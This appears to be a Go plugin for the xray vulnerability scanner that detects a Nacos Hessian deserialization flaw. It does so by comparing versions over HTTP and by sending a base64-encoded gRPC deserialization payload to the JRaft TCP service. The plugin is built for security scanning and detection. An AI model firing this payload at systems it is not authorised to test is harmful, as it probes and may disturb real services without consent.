package plugin

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"github.com/chaitin/xray/event"
	"github.com/chaitin/xray/plugin/module/dialer"
	"github.com/chaitin/xray/plugin/module/xhttp"
	"github.com/chaitin/xray/util/nice"
	"github.com/chaitin/xray/xray"
	"os"
	"os/user"
	"path/filepath"
	"reflect"
	"regexp"
	"strconv"
	"strings"
)

var (
	versionRegexp = regexp.MustCompile("^" + VersionRegexpRaw + "$")
)

const (
	VersionRegexpRaw string = `v?([0-9]+(\.[0-9]+)*?)` +
		`(-([0-9]+[0-9A-Za-z\-~]*(\.[0-9A-Za-z\-~]+)*)|(-?([A-Za-z\-~]+[0-9A-Za-z\-~]*(\.[0-9A-Za-z\-~]+)*)))?` +
		`(\+([0-9A-Za-z\-~]+(\.[0-9A-Za-z\-~]+)*))?` +
		`?`

	// SemverRegexpRaw requires a separator between version and prerelease
	SemverRegexpRaw string = `v?([0-9]+(\.[0-9]+)*?)` +
		`(-([0-9]+[0-9A-Za-z\-~]*(\.[0-9A-Za-z\-~]+)*)|(-([A-Za-z\-~]+[0-9A-Za-z\-~]*(\.[0-9A-Za-z\-~]+)*)))?` +
		`(\+([0-9A-Za-z\-~]+(\.[0-9A-Za-z\-~]+)*))?` +
		`?`
)

type Version struct {
	metadata string
	pre      string
	segments []int64
	si       int
	original string
}

func (v *Version) Compare(other *Version) int {
	// A quick, efficient equality check
	if v.String() == other.String() {
		return 0
	}

	segmentsSelf := v.Segments64()
	segmentsOther := other.Segments64()

	// If the segments are the same, we must compare on prerelease info
	if reflect.DeepEqual(segmentsSelf, segmentsOther) {
		preSelf := v.Prerelease()
		preOther := other.Prerelease()
		if preSelf == "" && preOther == "" {
			return 0
		}
		if preSelf == "" {
			return 1
		}
		if preOther == "" {
			return -1
		}

		return comparePrereleases(preSelf, preOther)
	}

	// Get the highest specificity (hS), or if they're equal, just use segmentSelf length
	lenSelf := len(segmentsSelf)
	lenOther := len(segmentsOther)
	hS := lenSelf
	if lenSelf < lenOther {
		hS = lenOther
	}
	// Compare the segments
	// Because a constraint could have more/less specificity than the version it's
	// checking, we need to account for a lopsided or jagged comparison
	for i := 0; i < hS; i++ {
		if i > lenSelf-1 {
			// This means Self had the lower specificity
			// Check to see if the remaining segments in Other are all zeros
			if !allZero(segmentsOther[i:]) {
				// if not, it means that Other has to be greater than Self
				return -1
			}
			break
		} else if i > lenOther-1 {
			// this means Other had the lower specificity
			// Check to see if the remaining segments in Self are all zeros -
			if !allZero(segmentsSelf[i:]) {
				//if not, it means that Self has to be greater than Other
				return 1
			}
			break
		}
		lhs := segmentsSelf[i]
		rhs := segmentsOther[i]
		if lhs == rhs {
			continue
		} else if lhs < rhs {
			return -1
		}
		// Otherwis, rhs was > lhs, they're not equal
		return 1
	}

	// if we got this far, they're equal
	return 0
}

func (v *Version) String() string {
	var buf bytes.Buffer
	fmtParts := make([]string, len(v.segments))
	for i, s := range v.segments {
		// We can ignore err here since we've pre-parsed the values in segments
		str := strconv.FormatInt(s, 10)
		fmtParts[i] = str
	}
	fmt.Fprintf(&buf, strings.Join(fmtParts, "."))
	if v.pre != "" {
		fmt.Fprintf(&buf, "-%s", v.pre)
	}
	if v.metadata != "" {
		fmt.Fprintf(&buf, "+%s", v.metadata)
	}

	return buf.String()
}

func allZero(segs []int64) bool {
	for _, s := range segs {
		if s != 0 {
			return false
		}
	}
	return true
}

func (v *Version) Segments64() []int64 {
	result := make([]int64, len(v.segments))
	copy(result, v.segments)
	return result
}

func (v *Version) Prerelease() string {
	return v.pre
}

func comparePart(preSelf string, preOther string) int {
	if preSelf == preOther {
		return 0
	}

	var selfInt int64
	selfNumeric := true
	selfInt, err := strconv.ParseInt(preSelf, 10, 64)
	if err != nil {
		selfNumeric = false
	}

	var otherInt int64
	otherNumeric := true
	otherInt, err = strconv.ParseInt(preOther, 10, 64)
	if err != nil {
		otherNumeric = false
	}

	// if a part is empty, we use the other to decide
	if preSelf == "" {
		if otherNumeric {
			return -1
		}
		return 1
	}

	if preOther == "" {
		if selfNumeric {
			return 1
		}
		return -1
	}

	if selfNumeric && !otherNumeric {
		return -1
	} else if !selfNumeric && otherNumeric {
		return 1
	} else if !selfNumeric && !otherNumeric && preSelf > preOther {
		return 1
	} else if selfInt > otherInt {
		return 1
	}

	return -1
}

func comparePrereleases(v string, other string) int {
	// the same pre release!
	if v == other {
		return 0
	}

	// split both pre releases for analyse their parts
	selfPreReleaseMeta := strings.Split(v, ".")
	otherPreReleaseMeta := strings.Split(other, ".")

	selfPreReleaseLen := len(selfPreReleaseMeta)
	otherPreReleaseLen := len(otherPreReleaseMeta)

	biggestLen := otherPreReleaseLen
	if selfPreReleaseLen > otherPreReleaseLen {
		biggestLen = selfPreReleaseLen
	}

	// loop for parts to find the first difference
	for i := 0; i < biggestLen; i = i + 1 {
		partSelfPre := ""
		if i < selfPreReleaseLen {
			partSelfPre = selfPreReleaseMeta[i]
		}

		partOtherPre := ""
		if i < otherPreReleaseLen {
			partOtherPre = otherPreReleaseMeta[i]
		}

		compare := comparePart(partSelfPre, partOtherPre)
		// if parts are equals, continue the loop
		if compare != 0 {
			return compare
		}
	}

	return 0
}

func (v *Version) GreaterThan(o *Version) bool {
	return v.Compare(o) > 0
}

func (v *Version) LessThan(o *Version) bool {
	return v.Compare(o) < 0
}

func (v *Version) Equal(o *Version) bool {
	if v == nil || o == nil {
		return v == o
	}

	return v.Compare(o) == 0
}

func newVersion(v string, pattern *regexp.Regexp) (*Version, error) {
	matches := pattern.FindStringSubmatch(v)
	if matches == nil {
		return nil, fmt.Errorf("Malformed version: %s", v)
	}
	segmentsStr := strings.Split(matches[1], ".")
	segments := make([]int64, len(segmentsStr))
	for i, str := range segmentsStr {
		val, err := strconv.ParseInt(str, 10, 64)
		if err != nil {
			return nil, fmt.Errorf(
				"Error parsing version: %s", err)
		}

		segments[i] = val
	}

	// Even though we could support more than three segments, if we
	// got less than three, pad it with 0s. This is to cover the basic
	// default usecase of semver, which is MAJOR.MINOR.PATCH at the minimum
	for i := len(segments); i < 3; i++ {
		segments = append(segments, 0)
	}

	pre := matches[7]
	if pre == "" {
		pre = matches[4]
	}

	return &Version{
		metadata: matches[10],
		pre:      pre,
		segments: segments,
		si:       len(segmentsStr),
		original: v,
	}, nil
}

var _ = xray.NewPlugin("poc-go-nacos-hessian-deser", func(p *xray.Plugin, client *xhttp.Client, dialer *dialer.Dialer) {
	// 删除一下之前的旧插件
	var home string
	u, err := user.Current()
	if err != nil {
		home = "."
	} else {
		home = u.HomeDir
	}
	oldPath := filepath.Join(home, ".xray", "xpoc", "plugins", "yaml-poc-alibaba-nacos_jraftserver-deserialization-CT-750794.yml.bin")
	_, err = os.Stat(oldPath)
	if err == nil {
		_ = os.Remove(oldPath)
	}

	singleMode := len(p.Engine().Plugins()) == 1

	if singleMode {
		p.Info(nice.Red("该Nacos漏洞探测插件对HTTP服务目标进行【版本匹配】检测，对TCP服务进行【原理性】检测\n" +
			"                           由于考虑到对目标环境的损害，仅对 2.x 版本实施【原理性】检测，如需检测 1.x 版本是否存在漏洞，请使用 HTTP 服务目标作为输入"))
	}

	p.Event(func(srv *event.Service) *event.Vulnerability {
		if strings.ToLower(srv.Protocol[0]) != "tcp" {
			return nil
		}
		var buf [1024]byte
		r0, _ := base64.StdEncoding.DecodeString("UFJJICogSFRUUC8yLjANCg0KU00NCg0KAAAYBAAAAAAAAAIAAAAAAAMAAAAAAAQAEAAAAAYAACAAAAAECAAAAAAAAA8AAQ==")
		r1, _ := base64.StdEncoding.DecodeString("AAAABAEAAAAA")
		r2, _ := base64.StdEncoding.DecodeString("AAC6ASQAAAADAAAAAA9BDmxvY2FsaG9zdDo3ODQ4RDgvY29tLmFsaWJhYmEubmFjb3MuY29uc2lzdGVuY3kuZW50aXR5LldyaXRlUmVxdWVzdC9fY2FsbIOGXxBhcHBsaWNhdGlvbi9ncnBjQAJ0ZQh0cmFpbGVyc3oWZ3JwYy1qYXZhLW5ldHR5LzEuNTAuMkAUZ3JwYy1hY2NlcHQtZW5jb2RpbmcEZ3ppcEAMZ3JwYy10aW1lb3V0CDQ3Nzg2MDJ1AAEUAAEAAAADAAAAAQ8KF25hbWluZ19zZXJ2aWNlX21ldGFkYXRhGu4BQzA7Y29tLmFsaWJhYmEubmFjb3MubmFtaW5nLmNvcmUudjIubWV0YWRhdGEuTWV0YWRhdGFPcGVyYXRpb26VCW5hbWVzcGFjZQVncm91cAtzZXJ2aWNlTmFtZQN0YWcIbWV0YWRhdGFgDGNoYWl0aW5fdGVzdBduYW1pbmdfc2VydmljZV9tZXRhZGF0YQxjaGFpdGluX3Rlc3QIdGVzdF90YWdDMDFjb20uc3VuLm9yZy5hcGFjaGUueHBhdGguaW50ZXJuYWwub2JqZWN0cy5YU3RyaW5nkgVtX29iaghtX3BhcmVudGEDeHgxTioDQURE")

		data := append(append(r0, r1...), r2...)
		conn, err := dialer.Dial("tcp", srv.Addr())
		p.Check(err)

		if _, err = conn.Read(buf[:]); err != nil {
			return nil
		}

		_, err = conn.Write(data)
		p.Check(err)

		if _, err = conn.Read(buf[:]); err != nil {
			return nil
		}

		r3, _ := base64.StdEncoding.DecodeString("AAAIBgEAAAAAAAAAAAAABNI=")
		_, err = conn.Write(r3)
		p.Check(err)

		if _, err = conn.Read(buf[:]); err != nil {
			return nil
		}

		if bytes.Contains(buf[:], []byte("com.sun.org.apache.xpath.internal.objects.XString")) {
			vuln := p.NewServiceVulnerability(srv)
			vuln.Links = append(vuln.Links, "https://stack.chaitin.com/techblog/detail?id=106")
			return vuln
		}

		return nil
	})

	p.Event(func(website *event.Website) *event.Vulnerability {
		req, _, err := xhttp.LoadFromEvent(website.HttpFlow)
		p.Check(err)

		r0 := req.Clone()
		err = r0.ReplaceURI("/nacos/v1/console/server/state")
		p.Check(err)

		resp0, err := client.Do(r0)
		p.Check(err)

		respString := string(resp0.GetBody())
		versionPattern, _ := regexp.Compile("\"version\":\"([0-9\\\\.]+)")
		modePattern, _ := regexp.Compile("\"standalone_mode\":\"([a-z]+)\"")

		versionMatches := versionPattern.FindStringSubmatch(respString)
		modeMatches := modePattern.FindStringSubmatch(respString)

		var versionStr string
		var mode string
		if len(versionMatches) == 2 && len(modeMatches) == 2 {
			versionStr = versionMatches[1]
			mode = modeMatches[1]
		} else {
			return nil
		}

		v0, _ := newVersion("1.4.6", versionRegexp)
		v2, _ := newVersion("2.2.3", versionRegexp)
		v3, _ := newVersion("1.4.0", versionRegexp)
		v4, _ := newVersion("2.0.0", versionRegexp)
		currentVersion, _ := newVersion(versionStr, versionRegexp)

		// 如果版本在 1-2 之间且大于等于修复版本
		if currentVersion.LessThan(v4) && (currentVersion.Equal(v0) || currentVersion.GreaterThan(v0)) {
			return nil
		}
		// 如果版本大于等于 2.2.3 且大于修复版本
		if currentVersion.Equal(v2) || currentVersion.GreaterThan(v2) {
			return nil
		}

		// 如果版本在 1.4.0 之前，则不存在此漏洞
		if currentVersion.LessThan(v3) {
			return nil
		}

		// 如果版本在 1.4.6 之前，则判断是否为集群模式，如果不为则接着判断是否版本是 1.4.0
		if currentVersion.LessThan(v0) {
			if mode == "cluster" || currentVersion.Equal(v3) {
				return p.NewWebVulnerability(website)
			}
		}

		// 如果版本大于等于 2.0.0 且小于修复版本
		if (currentVersion.GreaterThan(v4) || currentVersion.Equal(v4)) && currentVersion.LessThan(v2) {
			vuln := p.NewWebVulnerability(website)
			vuln.Links = append(vuln.Links, "https://stack.chaitin.com/techblog/detail?id=106")
			return vuln
		}

		return nil
	})

})
